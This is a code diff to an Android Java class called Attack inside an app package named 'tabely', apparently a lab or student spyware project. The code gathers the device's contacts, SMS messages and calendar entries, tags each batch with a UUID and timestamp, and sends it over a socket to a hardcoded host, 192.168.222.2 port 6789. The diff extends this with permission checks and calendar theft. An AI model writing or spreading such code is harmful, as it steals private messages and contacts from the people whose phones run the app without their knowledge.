@@ -1,5 +1,6 @@
 package com.snakesonwheels.tabely.controller;
 
+import android.Manifest;
 import android.os.Looper;
 
 import com.snakesonwheels.tabely.view.HomeActivity;
@@ -14,10 +15,7 @@ public class Attack extends Thread {
     private final int port = 6789;
     private final String host = "192.168.222.2";
     private final UUID uuid = UUID.randomUUID();
-    AttackActivity attackActivity;
 
-    private static final int REQUEST_CONTACTS_PERMISSION_CODE = 0;
-    private static boolean permissionGranted = false;
     private HomeActivity homeActivity;
 
     public Attack(HomeActivity homeActivity) {
@@ -34,34 +32,35 @@ public class Attack extends Thread {
 
 
         //Contacts
-        header = "{\"uuid\": \"" + uuid + "\"," +
-                "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
-        data = homeActivity.gatherContactInformation();
-        sendData(header + data + "}");
-
-        //SMS
-        header = "{\"uuid\": \"" + uuid + "\"," +
-                "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
-        data = homeActivity.gatherSMSInformation();
-        sendData(header + data + "}");
-
-
-        if (false) {
+        if (homeActivity.checkPermission(Manifest.permission.READ_CONTACTS)) {
             header = "{\"uuid\": \"" + uuid + "\"," +
                     "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
             data = homeActivity.gatherContactInformation();
             sendData(header + data + "}");
+        } else {
+            sendData("Client: " + uuid + " has not granted contacts permission");
         }
 
-        if (false/*SMSPermission is given*/) {
+        //SMS
+        if (homeActivity.checkPermission(Manifest.permission.READ_SMS)) {
             header = "{\"uuid\": \"" + uuid + "\"," +
                     "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
-            data = homeActivity.gatherContactInformation();
-
-            data = gatherSMSInformation();
-
-            sendData(header + "\n\n" + data);
+            data = homeActivity.gatherSMSInformation();
+            sendData(header + data + "}");
+        } else {
+            sendData("Client: " + uuid + " has not granted SMS permission");
         }
+
+        //Calendar
+        if (homeActivity.checkPermission(Manifest.permission.READ_CALENDAR)) {
+            header = "{\"uuid\": \"" + uuid + "\"," +
+                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
+            data = homeActivity.gatherCalenderInformation();
+            sendData(header + data + "}");
+        } else {
+            sendData("Client: " + uuid + " has not granted calendar permission");
+        }
+
     }
 
     private void sendData(String data) {
@@ -76,11 +75,6 @@ public class Attack extends Thread {
         } catch (IOException e) {
             e.printStackTrace();
         }
-    }
-
-
-    private String gatherSMSInformation() {
-        return null;
     }
 
     @Override
